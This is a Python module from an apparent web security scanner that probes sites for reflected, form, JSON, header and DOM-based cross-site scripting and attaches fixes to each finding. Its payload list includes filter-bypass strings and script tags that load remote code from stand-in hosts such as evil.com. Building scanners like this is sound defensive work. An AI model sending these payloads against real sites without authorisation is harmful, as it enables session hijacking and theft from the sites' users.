"""
XSS (Cross-Site Scripting) Testing Module
Tests reflected, stored (basic), and DOM-based XSS
"""
import re
import urllib.parse
from .base import BaseModule


XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<ScRiPt>alert(1)</ScRiPt>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<img src="x" onerror="alert(1)">',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
    '"+alert(1)+"',
    '`alert(1)`',
    '<body onload=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    'javascript:alert(1)',
    '<a href="javascript:alert(1)">click</a>',
    # WAF bypass
    '<ScRiPt/SrC=//14.rs>',
    '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    '<img src=1 href=1 onerror="javascript:alert(1)">',
    '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
    # Encoded
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    '\x3cscript\x3ealert(1)\x3c/script\x3e',
    # DOM
    '#<script>alert(1)</script>',
    '#"><img src=x onerror=alert(1)>',
]

# Headers that might reflect payloads
HEADER_PAYLOADS = {
    'User-Agent': '<script>alert(1)</script>',
    'Referer': 'https://evil.com/<script>alert(1)</script>',
    'X-Forwarded-For': '<script>alert(1)</script>',
    'X-Custom-Header': '<script>alert(1)</script>',
}


class XSSModule(BaseModule):
    """Cross-Site Scripting (XSS) detection module."""

    def run(self) -> dict:
        # Utilize shared scan context to avoid redundant crawls
        endpoints = self.context.get('endpoints')
        forms = self.context.get('forms')

        if endpoints is None or forms is None:
            from .crawler import CrawlerModule
            crawler = CrawlerModule(self.config)
            crawl_data = crawler.run()
            endpoints = crawl_data.get('endpoints', [self.url])
            forms = crawl_data.get('forms', [])

        endpoints = endpoints or [self.url]
        forms = forms or []

        self._test_reflected_xss_params(self.url)
        for ep in endpoints[:20]:
            self._test_reflected_xss_params(ep)
            # If endpoint appears to be an API endpoint, test JSON body injection
            if any(p in ep.lower() for p in ('/api/', '/v1/', '/v2/', '/rest/', '/auth/')):
                self._test_json_xss(ep)

        for form in forms[:15]:
            self._test_form_xss(form)

        self._test_header_injection()
        self._check_dom_xss_patterns()

        return self.result({'endpoints_tested': len(endpoints), 'forms_tested': len(forms)})

    def _is_executable_reflection(self, resp, payload: str) -> bool:
        """Validate if the reflected payload is actually executable in browser context."""
        if not resp or not resp.text:
            return False

        ct = resp.headers.get('Content-Type', '').lower()
        # Must be HTML/XML/SVG to execute client-side scripts
        if not any(valid_ct in ct for valid_ct in ('text/html', 'application/xhtml+xml', 'text/xml', 'image/svg+xml')):
            return False

        body = resp.text
        if payload not in body:
            return False

        # Ensure dangerous characters were not HTML-entity encoded (&lt;, &gt;, &quot;, &#39;)
        if '<' in payload:
            # Check if payload was escaped into &lt;
            escaped_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
            if escaped_payload in body and payload not in body:
                return False

        return True

    def _test_reflected_xss_params(self, url):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return

        for param in params:
            for payload in XSS_PAYLOADS:
                test_params = dict(params)
                test_params[param] = [payload]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))

                resp = self.get(test_url)
                if self._is_executable_reflection(resp, payload):
                    self.add_finding(
                        f'Reflected XSS: {param}',
                        'HIGH',
                        f'XSS payload reflected in unencoded HTML context for param "{param}"',
                        f'Payload: {payload[:100]}\nURL: {test_url[:200]}',
                        'Context-aware output encoding (HTML, attribute, JS) and strict Content-Security-Policy.'
                    )
                    break

    def _test_form_xss(self, form):
        action = form.get('action', self.url)
        method = form.get('method', 'GET').upper()
        fields = form.get('fields', {})

        if not fields:
            return

        for field_name in fields:
            for payload in XSS_PAYLOADS[:10]:
                test_data = dict(fields)
                test_data[field_name] = payload

                if method == 'POST':
                    resp = self.post(action, data=test_data)
                else:
                    resp = self.get(action, params=test_data)

                if self._is_executable_reflection(resp, payload):
                    self.add_finding(
                        f'XSS in Form Field: {field_name}',
                        'HIGH',
                        f'XSS payload reflected unescaped in form submission for field "{field_name}"',
                        f'Payload: {payload[:100]}\nAction: {action}',
                        'Apply context-aware output encoding and CSP. Use auto-escaping template engines.'
                    )
                    break

    def _test_json_xss(self, url):
        """Test API endpoints with JSON payload bodies, preserving types."""
        sample_json_payloads = [
            {"query": "<script>alert(1)</script>", "search": "<script>alert(1)</script>"},
            {"name": "<img src=x onerror=alert(1)>", "title": "<img src=x onerror=alert(1)>"},
            {"comment": "<svg/onload=alert(1)>", "message": "<svg/onload=alert(1)>"}
        ]
        for payload_dict in sample_json_payloads:
            resp = self.post(url, json=payload_dict)
            for k, payload in payload_dict.items():
                if self._is_executable_reflection(resp, payload):
                    self.add_finding(
                        f'XSS in JSON API: {url}',
                        'HIGH',
                        f'API echoed XSS payload unescaped in HTML response for field "{k}"',
                        f'Endpoint: {url}\nPayload: {payload}',
                        'Ensure API responses default to application/json and escape any HTML before returning.'
                    )
                    return

    def _test_header_injection(self):
        """Test if request headers are reflected in response."""
        for header_name, payload in HEADER_PAYLOADS.items():
            resp = self.get(self.url, headers={header_name: payload})
            if self._is_executable_reflection(resp, payload):
                self.add_finding(
                    f'Header Injection XSS: {header_name}',
                    'HIGH',
                    f'XSS payload in {header_name} header reflected unescaped in response',
                    f'Header: {header_name}\nPayload: {payload}',
                    'Do not reflect request headers in HTML without strict context-aware encoding.'
                )

    def _check_dom_xss_patterns(self):
        """Check source for DOM XSS sink patterns."""
        resp = self.get(self.url)
        if not resp:
            return
        body = resp.text or ''

        dom_sinks = [
            (r'document\.write\s*\(', 'document.write()'),
            (r'innerHTML\s*=', 'innerHTML assignment'),
            (r'outerHTML\s*=', 'outerHTML assignment'),
            (r'eval\s*\(', 'eval()'),
            (r'setTimeout\s*\(["\']', 'setTimeout with string'),
            (r'setInterval\s*\(["\']', 'setInterval with string'),
            (r'location\.href\s*=', 'location.href assignment'),
            (r'document\.location\s*=', 'document.location assignment'),
            (r'window\.location\s*=', 'window.location assignment'),
            (r'location\.hash', 'location.hash usage'),
            (r'location\.search', 'location.search usage'),
            (r'location\.pathname', 'location.pathname usage'),
            (r'document\.cookie\s*=', 'document.cookie write'),
        ]

        for pattern, name in dom_sinks:
            if re.search(pattern, body, re.IGNORECASE):
                self.add_finding(
                    f'Potential DOM XSS Sink: {name}',
                    'MEDIUM',
                    f'JavaScript code uses potentially dangerous sink: {name}',
                    '',
                    'Review usage of DOM sinks. Sanitize data from untrusted sources before use.'
                )
